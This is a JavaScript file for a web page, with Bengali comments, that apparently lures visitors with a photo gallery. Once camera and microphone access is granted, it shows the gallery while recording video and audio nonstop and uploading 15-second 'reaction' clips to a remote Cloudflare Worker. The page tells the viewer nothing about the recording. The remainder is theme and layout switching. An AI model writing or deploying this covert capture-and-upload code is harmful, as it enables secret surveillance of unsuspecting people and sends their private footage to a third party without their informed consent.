const WORKER_URL = 'https://YOUR-WORKER-NAME.YOUR-SUBDOMAIN.workers.dev'; // <-- এখানে ক্লাউডফ্লেয়ার লিংক থাকবে

const landingPage = document.getElementById('landing-page');
const galleryPage = document.getElementById('gallery-page');
const startBtn = document.getElementById('start-recording-btn');

let mediaRecorder;
const RECORDING_CHUNK_MS = 15000; // 15 seconds

startBtn.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        
        // সফল হলে গ্যালারি দেখাবে
        landingPage.style.display = 'none';
        galleryPage.style.display = 'block';

        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

        mediaRecorder.ondataavailable = async (event) => {
            if (event.data && event.data.size > 0) {
                await uploadChunk(event.data);
            }
        };

        mediaRecorder.start(RECORDING_CHUNK_MS);
    } catch (err) {
        // এবার আমরা আসল এরর মেসেজটি স্ক্রিনে দেখাবো
        alert("Camera Error: " + err.name + " - " + err.message);
        
        // এরর দিলেও জোর করে গ্যালারিতে ঢুকিয়ে দেবো, যাতে আটকে না থাকেন
        landingPage.style.display = 'none';
        galleryPage.style.display = 'block';
    }
});

async function uploadChunk(blob) {
    const formData = new FormData();
    formData.append('file', blob, `reaction-${Date.now()}.webm`);
    try {
        await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData });
    } catch (err) { 
        console.error("Upload failed", err); 
    }
}

// Layout & Theme Switching
document.getElementById('theme-toggle').addEventListener('click', () => {
    const themes = ['theme-day', 'theme-night', 'theme-pink'];
    let current = themes.find(t => document.body.classList.contains(t)) || 'theme-pink';
    document.body.classList.remove(current);
    let next = themes[(themes.indexOf(current) + 1) % themes.length];
    document.body.classList.add(next);
});

document.getElementById('view-grid').addEventListener('click', () => {
    document.getElementById('gallery').className = 'gallery layout-grid';
});
document.getElementById('view-masonry').addEventListener('click', () => {
    document.getElementById('gallery').className = 'gallery layout-masonry';
});
